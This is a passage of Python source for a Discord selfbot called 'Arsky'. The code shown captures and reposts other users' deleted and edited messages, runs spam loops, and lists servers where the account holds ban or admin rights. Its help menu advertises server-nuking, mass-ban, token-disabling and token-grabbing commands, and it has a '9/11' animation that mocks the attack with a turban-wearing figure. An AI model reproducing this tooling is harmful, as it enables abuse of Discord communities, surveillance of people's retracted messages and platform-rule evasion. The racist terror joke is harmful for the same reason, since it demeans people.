          await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
      while Arsky.mee6 is True:
          sentences = ['Stop waiting for exceptional things to just happen.',
                      'The lyrics of the song sounded like fingernails on a chalkboard.',
                      'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
                      'He had a hidden stash underneath the floorboards in the back room of the house.',
                      'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
                      'People generally approve of dogs eating cat food but not cats eating dog food.',
                      'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
                      'She was the type of girl who wanted to live in a pink house.',
                      'The bees decided to have a mutiny against their queen.',
                      'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
                      'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
                      'They desperately needed another drummer since the current one only knew how to play bongos.',
                      'He waited for the stop sign to turn to a go sign.',
                      'His thought process was on so many levels that he gave himself a phobia of heights.',
                      'Her hair was windswept as she rode in the black convertible.',
                      'Karen realized the only way she was getting into heaven was to cheat.',
                      'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
                      'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
                      'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
                      'You probably shouldn\'t look at your feet.',
                      'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
                      'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
                      'The three-year-old girl ran down the beach as the kite flew behind her.',
                      'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
                      'They improved dramatically once the lead singer left.',
                      'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
                      'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
                      'People keep telling me "orange" but I still prefer "pink".',
                      'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                      'I liked their first two albums but changed my mind after that charity gig.',
                      'Plans for this weekend include turning wine into water.',
                      'A kangaroo is really just a rabbit on steroids.',
                      'He played the game as if his life depended on it and the truth was that it did.',
                      'He\'s in a boy band which doesn\'t make much sense for a snake.',
                      'She let the balloon float up into the air with her hopes and dreams.',
                      'There was coal in his stocking and he was thrilled.',
                      'This made him feel like an old-style rootbeer float smells.',
                      'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                      'The light in his life was actually a fire burning all around him.',
                      'Truth in advertising and dinosaurs with skateboards have much in common.',
                      'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                      'The view from the lighthouse excited even the most seasoned traveler.',
                      'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                      'It\'s difficult to understand the lengths he\'d go to remain short.',
                      'Nobody questions who built the pyramids in Mexico.',
                      'They ran around the corner to find that they had traveled back in time.']
          await Arsky.get_channel(Arsky.mee6_channel).send(random.choice(sentences), delete_after=0.1)
          await asyncio.sleep(60)


  @Arsky.command(aliases=['slotsniper', "slotbotsniper"])
  async def slotbot(ctx, param=None):
      await ctx.message.delete()
      Arsky.slotbot_sniper = False
      if str(param).lower() == 'true' or str(param).lower() == 'on':
          Arsky.slotbot_sniper = True
      elif str(param).lower() == 'false' or str(param).lower() == 'off':
          Arsky.slotbot_sniper = False


  @Arsky.command(aliases=['giveawaysniper'])
  async def giveaway(ctx, param=None):
      await ctx.message.delete()
      Arsky.giveaway_sniper = False
      if str(param).lower() == 'true' or str(param).lower() == 'on':
          Arsky.giveaway_sniper = True
      elif str(param).lower() == 'false' or str(param).lower() == 'off':
          Arsky.giveaway_sniper = False


  @Arsky.event
  async def on_message_delete(message):
      if message.author.id == Arsky.user.id:
          return
      if Arsky.msgsniper:
          if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
              attachments = message.attachments
              if len(attachments) == 0:
                  message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                      message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                  await message.channel.send(message_content)
              else:
                  links = ""
                  for attachment in attachments:
                      links += attachment.proxy_url + "\n"
                  message_content = "`" + str(
                      discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                      message.content) + "\n\n**Attachments:**\n" + links
                  await message.channel.send(message_content)
      if len(Arsky.sniped_message_dict) > 1000:
          Arsky.sniped_message_dict.clear()
      attachments = message.attachments
      if len(attachments) == 0:
          channel_id = message.channel.id
          message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
              message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
          Arsky.sniped_message_dict.update({channel_id: message_content})
      else:
          links = ""
          for attachment in attachments:
              links += attachment.proxy_url + "\n"
          channel_id = message.channel.id
          message_content = "`" + str(
              discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
              message.content) + "\n\n**Attachments:**\n" + links
          Arsky.sniped_message_dict.update({channel_id: message_content})


  @Arsky.event
  async def on_message_edit(before, after):
      if before.author.id == Arsky.user.id:
          return
      if Arsky.msgsniper:
          if before.content is after.content:
              return
          if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
              attachments = before.attachments
              if len(attachments) == 0:
                  message_content = "`" + str(
                      discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                      before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                      "@\u200bhere") + "\n**AFTER**\n" + str(
                      after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                  await before.channel.send(message_content)
              else:
                  links = ""
                  for attachment in attachments:
                      links += attachment.proxy_url + "\n"
                  message_content = "`" + str(
                      discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                      before.content) + "\n\n**Attachments:**\n" + links
                  await before.channel.send(message_content)
      if len(Arsky.sniped_edited_message_dict) > 1000:
          Arsky.sniped_edited_message_dict.clear()
      attachments = before.attachments
      if len(attachments) == 0:
          channel_id = before.channel.id
          message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
              before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                              "@\u200bhere") + "\n**AFTER**\n" + str(
              after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
          Arsky.sniped_edited_message_dict.update({channel_id: message_content})
      else:
          links = ""
          for attachment in attachments:
              links += attachment.proxy_url + "\n"
          channel_id = before.channel.id
          message_content = "`" + str(
              discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
              before.content) + "\n\n**Attachments:**\n" + links
          Arsky.sniped_edited_message_dict.update({channel_id: message_content})


  @Arsky.command()
  async def snipe(ctx):
      await ctx.message.delete()
      currentChannel = ctx.channel.id
      if currentChannel in Arsky.sniped_message_dict:
          await ctx.send(Arsky.sniped_message_dict[currentChannel])
      else:
          await ctx.send("No message to snipe!")


  @Arsky.command(aliases=["esnipe"])
  async def editsnipe(ctx):
      await ctx.message.delete()
      currentChannel = ctx.channel.id
      if currentChannel in Arsky.sniped_edited_message_dict:
          await ctx.send(Arsky.sniped_edited_message_dict[currentChannel])
      else:
          await ctx.send("No message to snipe!")


  @Arsky.command()
  async def adminservers(ctx):
      await ctx.message.delete()
      admins = []
      bots = []
      kicks = []
      bans = []
      for guild in Arsky.guilds:
          if guild.me.guild_permissions.administrator:
              admins.append(discord.utils.escape_markdown(guild.name))
          if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
              bots.append(discord.utils.escape_markdown(guild.name))
          if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
              bans.append(discord.utils.escape_markdown(guild.name))
          if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
              kicks.append(discord.utils.escape_markdown(guild.name))
      adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
      botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
      banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
      kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
      await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


  @Arsky.command()
  async def bots(ctx):
      await ctx.message.delete()
      bots = []
      for member in ctx.guild.members:
          if member.bot:
              bots.append(
                  str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
      bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
      await ctx.send(bottiez)


  @Arsky.command()
  async def help(ctx, category=None):
      await ctx.message.delete()
      if category is None:
          embed = discord.Embed(color=0xADD8E6, timestamp=ctx.message.created_at)
          embed.set_author(name="Eagle On Top xdd " + str(Arsky.command_prefix),
                          icon_url=Arsky.user.avatar_url)
          embed.set_thumbnail(url=Arsky.user.avatar_url)
          embed.set_image(url="")
          embed.add_field(name="\uD83E\uDDCA `Daddy`", value="Shows all Arsky commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `ACCOUNT`", value="Shows all account commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `TEXT`", value="Shows all text commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `RAP`", value="Shows all music commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `IMAGE`", value="Shows all image manipulation commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `NSFW`", value="Shows all nsfw commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `MISC`", value="Shows all miscellaneous commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `ANTI-WIZZ`", value="Shows all anti-wizz commands", inline=True)
          embed.add_field(name="\uD83E\uDDCA `WIZZ`", value="Shows all wizz commands", inline=True)
          await ctx.send(embed=embed)
      elif str(category).lower() == "uwu":
          embed = discord.Embed(color=random.randrange(0xADD8E6), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `ARSKY COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n"
          await ctx.send(embed=embed)
      elif str(category).lower() == "account":
          embed = discord.Embed(color=random.randrange(0xADD8E6), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({Arsky.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({Arsky.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({Arsky.mee6}) <#{Arsky.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{Arsky.yui_kiss_user}> <#{Arsky.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{Arsky.yui_hug_user}> <#{Arsky.yui_hug_channel}>\n`> yuistop` - stops any running yui loops"
          await ctx.send(embed=embed)
      elif str(category).lower() == "text":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `TEXT COMMANDS`\n`> Arsky` - sends the Arsky logo\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({Arsky.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> dm <user> <content>` - dms a user a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> wizz` - makes a prank message about wizzing \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
          await ctx.send(embed=embed)
      elif str(category).lower() == "Rap":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `Gay COMMANDS`\n`> play <query>` - plays the specified song if you're in a voice-channel\n`> stop` - stops the rap player\n`> skip` - skips the current song playing\n`> lyrics <song>` - shows the specified song's lyrics\n`> youtube <query>` - returns the first youtube search result of the query"
          await ctx.send(embed=embed)
      elif str(category).lower() == "image":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(
              url="")
          embed.description = f"\uD83D\uDCB0 `IMAGE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> jpegify <user>` - jpegifies the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
          await ctx.send(embed=embed)
      elif str(category).lower() == "nsfw":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `NSFW COMMANDS`\n`> anal` - returns anal pics\n`> erofeet` - returns erofeet pics\n`> feet` - returns sexy feet pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> tits` - returns titty pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics"
          await ctx.send(embed=embed)
      elif str(category).lower() == "misc":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({Arsky.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
          await ctx.send(embed=embed)
      elif str(category).lower() == "antiwizz":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `ANTI-WIZZ COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({Arsky.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash"
          await ctx.send(embed=embed)
      elif str(category).lower() == "wizz":
          embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
          embed.set_image(url="")
          embed.description = f"\uD83D\uDCB0 `WIZZ COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> nuke` - wizzes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people"
          await ctx.send(embed=embed)


  # Arsky

  # ACCOUNT

  # TEXT

  # MUSIC


  # NSFW

  # MISC

  # ANTINUKE

  # WIZZ


  @Arsky.command()
  async def exeter(ctx):
      await ctx.message.delete()
      await ctx.send("""
  ░█████╗░██████╗░░██████╗██╗░░██╗██╗░░░██╗
  ██╔══██╗██╔══██╗██╔════╝██║░██╔╝╚██╗░██╔╝
  ███████║██████╔╝╚█████╗░█████═╝░░╚████╔╝░
  ██╔══██║██╔══██╗░╚═══██╗██╔═██╗░░░╚██╔╝░░
  ██║░░██║██║░░██║██████╔╝██║░╚██╗░░░██║░░░
  ╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
  """)


  @Arsky.command(aliases=["giphy", "tenor", "searchgif"])
  async def gif(ctx, query=None):
      await ctx.message.delete()
      if query is None:
          r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
          res = r.json()
          await ctx.send(res['data']['url'])

      else:
          r = requests.get(
              f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
          res = r.json()
          await ctx.send(res['data'][0]["url"])


  @Arsky.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
  async def image(ctx, *, args):
      await ctx.message.delete()
      url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
      page = requests.get(url)
      soup = bs4(page.text, 'html.parser')
      image_tags = soup.findAll('img')
      if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
          link = image_tags[2]['src']
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(link) as resp:
                      image = await resp.read()
              with io.BytesIO(image) as file:
                  await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"exeter_anal.png"))
          except:
              await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
      else:
          await ctx.send("Nothing found for **" + args + "**")


  @Arsky.command(aliases=["addemoji", "stealemote", "addemote"])
  async def stealemoji(ctx):
      await ctx.message.delete()
      custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
      unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"


  @Arsky.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
  async def stopcopycat(ctx):
      await ctx.message.delete()
      if Arsky.user is None:
          await ctx.send("You weren't copying anyone to begin with")
          return
      await ctx.send("Stopped copying " + str(Arsky.copycat))
      Arsky.copycat = None


  @Arsky.command(aliases=["copycatuser", "copyuser"])
  async def copycat(ctx, user: discord.User):
      await ctx.message.delete()
      Arsky.copycat = user
      await ctx.send("Now copying " + str(Arsky.copycat))


  @Arsky.command(aliases=["9/11", "911", "terrorist"])
  async def nine_eleven(ctx):
      await ctx.message.delete()
      invis = ""  # char(173)
      message = await ctx.send(f'''
  {invis}:man_wearing_turban::airplane:    :office:           
  ''')
      await asyncio.sleep(0.5)
      await message.edit(content=f'''
  {invis} :man_wearing_turban::airplane:   :office:           
  ''')
      await asyncio.sleep(0.5)
      await message.edit(content=f'''
  {invis}  :man_wearing_turban::airplane:  :office:           
  ''')
      await asyncio.sleep(0.5)
      await message.edit(content=f'''
  {invis}   :man_wearing_turban::airplane: :office:           
  ''')
      await asyncio.sleep(0.5)
      await message.edit(content=f'''
  {invis}    :man_wearing_turban::airplane::office:           
  ''')
      await asyncio.sleep(0.5)
      await message.edit(content='''
          :boom::boom::boom:    
          ''')


